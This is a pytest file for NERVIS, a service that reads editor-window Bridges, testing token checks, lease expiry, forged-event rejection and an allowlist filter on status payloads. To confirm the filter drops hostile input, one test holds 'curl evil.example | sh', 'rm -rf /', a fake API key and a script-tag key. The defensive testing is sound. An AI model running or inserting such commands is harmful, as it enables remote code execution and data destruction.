"""M8b — NERVIS reading a registered Bridge's `/v1/status` (`CLARVIS.md` §6.3).

Blocked until 29 Aug on Clarvis having a Bridge to read. What made it worth
waiting for is that a reader written against a specification alone would have
been a guess about a contract, and the registry row said `unknown` rather than
pretending — which is the honest version of being blocked.

Every test here stands up a fake Bridge on a real port, because the interesting
failures are the ones a real socket produces: a window that closed mid-poll, one
that answers with something that is not a Bridge at all, one that refuses the
token NERVIS holds.
"""

from __future__ import annotations

import json
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from typing import Any, Callable

import pytest
from fastapi.testclient import TestClient

from nervis.app import create_app
from nervis.bridges import MAX_CONFIG_CHARS, interpret
from nervis.config import Settings
from nervis.instances import LEASE_SECONDS

BRIDGE_TOKEN_HEADER = "Authorization"


def a_bridge(answer: Callable[[str], tuple[int, str]]) -> Any:
    """A fake Bridge on a real loopback port, answering however the test says.

    `answer` is given the presented `Authorization` header, so a test can make
    the fake behave like the real one — which requires NERVIS's token on every
    read since the Stage 8 amendment to §6.1.
    """
    seen: list[str] = []

    class Handler(BaseHTTPRequestHandler):
        def do_GET(self) -> None:  # noqa: N802 - BaseHTTPRequestHandler's name
            presented = self.headers.get(BRIDGE_TOKEN_HEADER, "")
            seen.append(presented)
            status, body = answer(presented)
            self.send_response(status)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(body.encode("utf-8"))

        def log_message(self, *_: Any) -> None:
            """Silent: the test runner's output is not a web server log."""

    server = HTTPServer(("127.0.0.1", 0), Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    server.seen = seen  # type: ignore[attr-defined]
    return server


@pytest.fixture
def api(tmp_path: Path) -> TestClient:
    return TestClient(create_app(Settings(database_path=str(tmp_path / "nervis.db"))))


def register(api: TestClient, port: int) -> tuple[str, str]:
    """Register a window pointing at `port`, returning its id and NERVIS's token."""
    secret = Path(api.app.state.settings.database_path).with_suffix(".enrollment").read_text()
    response = api.post(
        "/api/v1/registry/instances",
        json={
            "service": "clarvis",
            "instance_id": f"window-{port}",
            "machine_id": "machine-1",
            "port": port,
            "api_version": "1",
            "protocol_version": "1.0.0",
            "capabilities": {"clarvis.status.read": "1.0.0"},
        },
        headers={"Authorization": f"Bearer {secret.strip()}"},
    )
    assert response.status_code == 201, response.text
    return response.json()["instance"]["instance_id"], response.json()["token"]


# ── Reading a live Bridge ───────────────────────────────────────────────────


def test_a_live_bridge_is_read_and_its_state_reported(api: TestClient) -> None:
    running = json.dumps({"state": "agent_running", "steps_taken": 3, "elapsed_ms": 1200})
    bridge = a_bridge(lambda _: (200, running))
    try:
        instance_id, _ = register(api, bridge.server_address[1])

        body = api.get(f"/api/v1/registry/instances/clarvis/{instance_id}/status").json()

        assert body["reachable"] is True
        assert body["state"] == "agent_running"
        assert body["steps_taken"] == 3
        assert body["elapsed_ms"] == 1200
    finally:
        bridge.shutdown()


def test_nervis_presents_the_token_it_issued(api: TestClient) -> None:
    """§6.1 as amended: the Bridge requires NERVIS's token on every read.

    This is also what stops a local process that guessed the port from reading
    an editor's activity — the same hole §6.1's port-impersonation argument is
    about, read backwards.
    """
    bridge = a_bridge(lambda _: (200, json.dumps({"state": "idle"})))
    try:
        instance_id, token = register(api, bridge.server_address[1])

        api.get(f"/api/v1/registry/instances/clarvis/{instance_id}/status")

        assert bridge.seen == [f"Bearer {token}"]
    finally:
        bridge.shutdown()


def test_a_bridge_that_refuses_the_token_is_reported_not_guessed(api: TestClient) -> None:
    bridge = a_bridge(lambda _: (401, json.dumps({"error": {"code": "UNAUTHORIZED"}})))
    try:
        instance_id, _ = register(api, bridge.server_address[1])

        body = api.get(f"/api/v1/registry/instances/clarvis/{instance_id}/status").json()

        assert body["reachable"] is True
        assert body["state"] == "unknown"
        assert "refused" in body["detail"]
    finally:
        bridge.shutdown()


def test_a_window_that_closed_is_unreachable_rather_than_idle(api: TestClient) -> None:
    """A blank state reads as `idle`, which is a claim about a window that is gone."""
    bridge = a_bridge(lambda _: (200, json.dumps({"state": "idle"})))
    port = bridge.server_address[1]
    instance_id, _ = register(api, port)
    bridge.shutdown()
    bridge.server_close()

    body = api.get(f"/api/v1/registry/instances/clarvis/{instance_id}/status").json()

    assert body["reachable"] is False
    assert body["state"] == "unknown"


def test_an_unregistered_instance_is_a_404_not_a_probe(api: TestClient) -> None:
    response = api.get("/api/v1/registry/instances/clarvis/never-registered/status")

    assert response.status_code == 404
    assert response.json()["error"]["code"] == "NOT_FOUND"


def test_the_status_route_never_returns_the_token(api: TestClient) -> None:
    """The token NERVIS presents is held here and never travels outward.

    This endpoint is readable without the enrolment secret, exactly like the
    listing — so anything it returns is readable by a browser tab.
    """
    bridge = a_bridge(lambda _: (200, json.dumps({"state": "idle"})))
    try:
        instance_id, token = register(api, bridge.server_address[1])

        text = api.get(f"/api/v1/registry/instances/clarvis/{instance_id}/status").text

        assert token not in text
    finally:
        bridge.shutdown()


# ── What a Bridge is allowed to say ─────────────────────────────────────────


def test_only_the_six_states_are_passed_through() -> None:
    """The dashboard branches on these, and an unrecognised one renders as a
    state nobody can explain."""
    for state in ("idle", "chatting", "agent_running", "waiting_for_approval",
                  "stopping", "failed"):
        assert interpret({"state": state})["state"] == state

    assert interpret({"state": "running"})["state"] == "unknown"
    assert interpret({"state": ""})["state"] == "unknown"
    assert interpret({})["state"] == "unknown"


def test_a_gate_category_is_kept_and_anything_else_is_dropped() -> None:
    waiting = {"state": "waiting_for_approval"}

    assert interpret({**waiting, "awaiting": "command"})["awaiting"] == "command"
    assert "awaiting" not in interpret({**waiting, "awaiting": "rm -rf /"})


def test_nothing_outside_the_allowlist_survives() -> None:
    """The Bridge's port is dynamic and anything on this machine can bind one.

    §6.1's port-impersonation argument is exactly this case: a fabricated body
    must not reach a dashboard as though NERVIS had vouched for it.
    """
    hostile = {
        "state": "idle",
        "command": "curl evil.example | sh",
        "workspace_path": "/home/someone/private",
        "prompt": "the user's whole conversation",
        "token": "sk-live-1234",
        "<script>": "alert(1)",
    }

    assert set(interpret(hostile)) == {"state"}


def test_an_absent_count_stays_absent_rather_than_becoming_zero() -> None:
    """§6.3: unknown values stay unknown. Zero steps is a different claim."""
    assert "steps_taken" not in interpret({"state": "agent_running"})
    assert interpret({"state": "agent_running", "steps_taken": 0})["steps_taken"] == 0
    assert "steps_taken" not in interpret({"state": "agent_running", "steps_taken": "lots"})
    assert "steps_taken" not in interpret({"state": "agent_running", "steps_taken": -1})
    assert "elapsed_ms" not in interpret({"state": "idle", "elapsed_ms": None})


def test_a_boolean_is_not_a_count() -> None:
    """`True` is an `int` in Python, and `steps_taken: 1` from a `True` would be
    a step count NERVIS invented."""
    assert "steps_taken" not in interpret({"state": "agent_running", "steps_taken": True})


def test_the_activity_id_is_bounded() -> None:
    """The one free-form string in the payload, so it is the one to bound."""
    long_id = "x" * 500

    assert len(interpret({"state": "idle", "activity_id": long_id})["activity_id"]) == 64
    assert "activity_id" not in interpret({"state": "idle", "activity_id": ""})
    assert "activity_id" not in interpret({"state": "idle", "activity_id": 42})


# ── §10: a lease that lapsed, and the window behind it ──────────────────────


def _age_the_registry(api: TestClient, seconds: float) -> None:
    """Move every clock that decides whether a lease is still held.

    A lease expires by time passing, and a test that slept forty-five seconds
    to prove it would be a test nobody runs. Two clocks have to move together:
    the route reads `instances_clock` to judge liveness, and the registry keeps
    its own for stamping a renewal — shifting only the first makes a heartbeat
    land in the past and never revive anything, which is a fact about the test
    rather than about the code.
    """
    import time as _time

    shifted = lambda: _time.time() + seconds  # noqa: E731 - one expression, named for the seam
    api.app.state.instances_clock = shifted
    api.app.state.instances._now = shifted


def test_a_window_whose_lease_lapsed_is_gone_rather_than_probed(api: TestClient) -> None:
    """**`read_diagnostics` has claimed since it was written that "a dead window
    is a 404 the same as an unknown one", and nothing implemented it.** The
    lookup returned whatever was in the registry, and a lapsed row stays there
    until the sweep collects it — so NERVIS went to the port of a window that
    closed an hour ago and asked it for status. On a laptop that port is very
    often somebody else's process by then.
    """
    answered: list[str] = []
    bridge = a_bridge(lambda token: (answered.append(token), (200, "{}"))[1])
    try:
        instance_id, _ = register(api, bridge.server_address[1])
        _age_the_registry(api, LEASE_SECONDS + 1)

        response = api.get(f"/api/v1/registry/instances/clarvis/{instance_id}/status")

        assert response.status_code == 404
        assert answered == [], "a lapsed window was still asked for its status"
    finally:
        bridge.shutdown()


def test_a_window_that_comes_back_re_registers_into_the_same_row(api: TestClient) -> None:
    """Recovery from a lapse leaves one window, not two.

    A Bridge that lost its token has one way back: register again with the same
    `instance_id` (§5.1 — the token is issued once and is not readable out of
    the API). That is the recovery path, and it runs after a crash, after a
    reload, and after a laptop wakes up — so it has to be safe to run twice.
    A registry that appended instead of replacing would grow a row per restart,
    and every one of them would be probed at the same port.
    """
    bridge = a_bridge(lambda _: (200, "{}"))
    try:
        port = bridge.server_address[1]
        instance_id, first_token = register(api, port)
        _age_the_registry(api, LEASE_SECONDS + 1)

        again, second_token = register(api, port)

        assert again == instance_id
        rows = [
            row for row in api.get("/api/v1/registry/instances").json()["items"]
            if row["instance_id"] == instance_id
        ]
        assert len(rows) == 1, "a re-registered window must not become a second row"
        assert rows[0]["live"] is True
        # The lease is genuinely held again, by the new token and only by it.
        assert api.post(
            f"/api/v1/registry/instances/clarvis/{instance_id}/heartbeat",
            headers={"Authorization": f"Bearer {second_token}"},
        ).status_code == 200
        assert api.post(
            f"/api/v1/registry/instances/clarvis/{instance_id}/heartbeat",
            headers={"Authorization": f"Bearer {first_token}"},
        ).status_code == 401
    finally:
        bridge.shutdown()


def test_a_window_still_answering_is_not_displaced_by_a_second_claim(
    api: TestClient,
) -> None:
    """The other half: idempotent for the same process, refused for a rival.

    Re-registration is only safe because it cannot be used to take an id that
    is still held. Without this the test above would describe a registry where
    anybody holding the enrollment secret could point somebody else's window at
    their own port and be handed the token for it.
    """
    bridge = a_bridge(lambda _: (200, "{}"))
    try:
        port = bridge.server_address[1]
        instance_id, token = register(api, port)

        secret = Path(api.app.state.settings.database_path).with_suffix(".enrollment")
        rejected = api.post(
            "/api/v1/registry/instances",
            json={
                "service": "clarvis",
                "instance_id": instance_id,
                "machine_id": "machine-2",
                "port": port + 1,
                "api_version": "1",
                "protocol_version": "1.0.0",
                "capabilities": {"clarvis.status.read": "1.0.0"},
            },
            headers={"Authorization": f"Bearer {secret.read_text().strip()}"},
        )

        assert rejected.status_code == 409, rejected.text
        # And the window that was already there still holds its lease.
        assert api.post(
            f"/api/v1/registry/instances/clarvis/{instance_id}/heartbeat",
            headers={"Authorization": f"Bearer {token}"},
        ).status_code == 200
    finally:
        bridge.shutdown()


def test_a_lapsed_window_is_gone_from_diagnostics_and_config_too(api: TestClient) -> None:
    """Three routes take the same lookup, and a fix applied to one of them
    would look done. The diagnostics route is the one whose docstring made the
    promise; the config route makes the same outward call."""
    bridge = a_bridge(lambda _: (200, "{}"))
    try:
        instance_id, _ = register(api, bridge.server_address[1])
        _age_the_registry(api, LEASE_SECONDS + 1)

        base = f"/api/v1/registry/instances/clarvis/{instance_id}"
        assert api.get(f"{base}/diagnostics").status_code == 404
        assert api.get(f"{base}/config").status_code == 404
    finally:
        bridge.shutdown()


def test_a_lease_still_inside_its_window_is_read_normally(api: TestClient) -> None:
    """The falsifier. A liveness check that refused everything would pass every
    assertion above and take the feature with it."""
    bridge = a_bridge(lambda _: (200, json.dumps({"state": "idle"})))
    try:
        instance_id, _ = register(api, bridge.server_address[1])
        _age_the_registry(api, LEASE_SECONDS - 5)

        response = api.get(f"/api/v1/registry/instances/clarvis/{instance_id}/status")

        assert response.status_code == 200
        assert response.json()["state"] == "idle"
    finally:
        bridge.shutdown()


def test_a_renewed_lease_brings_the_window_back(api: TestClient) -> None:
    """A heartbeat is what a live window sends, and the registry's own answer
    has to change with it — otherwise the 404 above is a one-way door and a
    window that reconnected stays invisible."""
    bridge = a_bridge(lambda _: (200, json.dumps({"state": "idle"})))
    try:
        instance_id, token = register(api, bridge.server_address[1])
        _age_the_registry(api, LEASE_SECONDS + 1)
        base = f"/api/v1/registry/instances/clarvis/{instance_id}"
        assert api.get(f"{base}/status").status_code == 404

        beat = api.post(f"{base}/heartbeat", headers={"Authorization": f"Bearer {token}"})

        assert beat.status_code == 200
        assert api.get(f"{base}/status").status_code == 200
    finally:
        bridge.shutdown()


# ── §6.6: one window's events never appear under another ────────────────────


def test_an_event_claiming_a_registered_window_must_prove_it(api: TestClient) -> None:
    """**Verified against a running app before it was fixed.** `/api/v1/events`
    has no credential of its own and stored a claimed `source.instance_id`
    exactly as sent, so anything that could reach the port could post an event
    naming somebody else's editor window — and it came back under that window's
    diagnostics. §6.6 promises the opposite in those words: events and status
    from one window never appear under another.
    """
    bridge = a_bridge(lambda _: (200, "{}"))
    try:
        instance_id, _ = register(api, bridge.server_address[1])

        forged = api.post("/api/v1/events", json=[{
            "event_id": "forged-1",
            "event_type": "clarvis.agent.finished",
            "event_version": "1.0.0",
            "occurred_at": "2026-09-08T10:00:00.000Z",
            "source": {"service_type": "clarvis", "instance_id": instance_id},
            "trace_id": "4bf92f3577b34da6a3ce929d0e0e4736",
            "severity": "info",
            "data": {},
        }])

        body = forged.json()
        assert body["accepted"] == 0
        assert body["rejected"][0]["reason"] == "unproven_instance"
        seen = api.get(
            f"/api/v1/registry/instances/clarvis/{instance_id}/diagnostics"
        ).json()
        assert not [e for e in seen.get("events", []) if e.get("event_id") == "forged-1"]
    finally:
        bridge.shutdown()


def test_the_window_itself_is_still_believed(api: TestClient) -> None:
    """The falsifier, and the whole point of checking a token rather than
    refusing the field: the window that owns the id publishes exactly as it
    did, presenting the token NERVIS issued it at registration."""
    bridge = a_bridge(lambda _: (200, "{}"))
    try:
        instance_id, token = register(api, bridge.server_address[1])

        posted = api.post("/api/v1/events", headers={"Authorization": f"Bearer {token}"},
                          json=[{
                              "event_id": "genuine-1",
                              "event_type": "clarvis.agent.finished",
                              "event_version": "1.0.0",
                              "occurred_at": "2026-09-08T10:00:00.000Z",
                              "source": {"service_type": "clarvis", "instance_id": instance_id},
                              "trace_id": "4bf92f3577b34da6a3ce929d0e0e4736",
                              "severity": "info",
                              "data": {},
                          }])

        assert posted.json()["accepted"] == 1
    finally:
        bridge.shutdown()


def test_a_service_that_registers_no_instance_publishes_untouched(api: TestClient) -> None:
    """The other falsifier, and the reason the rule is scoped to *registered*
    ids. Every service puts an `instance_id` in its envelope; demanding a token
    for all of them would close the hub to the producers it exists for."""
    posted = api.post("/api/v1/events", json=[{
        "event_id": "ravis-1",
        "event_type": "ravis.route.decided",
        "event_version": "1.0.0",
        "occurred_at": "2026-09-08T10:00:00.000Z",
        "source": {"service_type": "ravis", "service_id": "r1", "instance_id": "i1"},
        "trace_id": "4bf92f3577b34da6a3ce929d0e0e4736",
        "severity": "info",
        "data": {},
    }])

    assert posted.json()["accepted"] == 1


# ── What a status reports beside the state (Clarvis 0.17.15, §6.3) ─────────

FULL_STATUS: dict[str, object] = {
    "state": "agent_running",
    "diagnostics_errors": 2, "diagnostics_warnings": 5, "diagnostics_information": 0,
    "diagnostics_hints": 1, "diagnostics_files": 3,
    "build_result": "failed", "build_finished_at": "2026-09-16T12:00:00Z",
    "test_result": "unknown", "test_finished_at": "2026-09-16T12:01:00Z",
    "last_request_id": "f" * 32, "last_request_model": "ravis/clarvis-agent",
    "last_request_provider": "custom", "last_request_result": "answered",
    "task_id": "nt_0123456789abcdef", "task_stage": "building",
    "event_cursor": 42,
}


def test_a_full_status_is_repeated_field_by_field() -> None:
    assert interpret(FULL_STATUS) == FULL_STATUS


def test_each_new_field_is_dropped_when_it_is_not_its_own_shape() -> None:
    odd = {
        **FULL_STATUS,
        "diagnostics_errors": -1, "diagnostics_files": "3", "event_cursor": True,
        "build_result": "green", "test_finished_at": "yesterday",
        "last_request_result": "<img>", "task_stage": "done",
    }
    shown = interpret(odd)
    for name in ("diagnostics_errors", "diagnostics_files", "event_cursor", "build_result",
                 "test_finished_at", "last_request_result", "task_stage"):
        assert name not in shown, name
    assert shown["diagnostics_warnings"] == 5


def test_a_request_or_task_id_in_the_wrong_shape_takes_its_details_with_it() -> None:
    shown = interpret({**FULL_STATUS, "last_request_id": "not-an-id",
                               "task_id": "nt_ABC"})
    for name in ("last_request_id", "last_request_model", "last_request_provider",
                 "last_request_result", "task_id", "task_stage"):
        assert name not in shown, name


def test_long_names_are_clipped() -> None:
    shown = interpret({**FULL_STATUS, "last_request_model": "m" * 500,
                               "last_request_provider": "p" * 500})
    assert len(shown["last_request_model"]) == MAX_CONFIG_CHARS
    assert len(shown["last_request_provider"]) == 40


def test_an_older_bridge_reports_only_what_it_did_before() -> None:
    older = {"state": "idle", "steps_taken": 3}
    assert interpret(older) == older
